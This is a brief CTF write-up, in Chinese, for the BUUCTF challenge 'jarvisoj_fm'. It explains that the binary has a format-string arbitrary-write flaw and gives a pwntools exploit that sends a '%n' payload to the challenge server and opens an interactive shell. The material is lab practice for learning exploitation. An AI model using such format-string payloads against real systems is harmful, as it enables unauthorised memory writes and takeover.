# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#jarvisoj_fm)

这是一道格式化字符串漏洞执行任意地址写，checksec一下

# exp

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
#p=process('./fm')
p=remote('node5.buuoj.cn',25516)
elf=ELF('./fm')
x=0x804A02C
payload=flat(b'%4c%13$n',p32(x))
p.sendline(payload)
p.interactive()
```

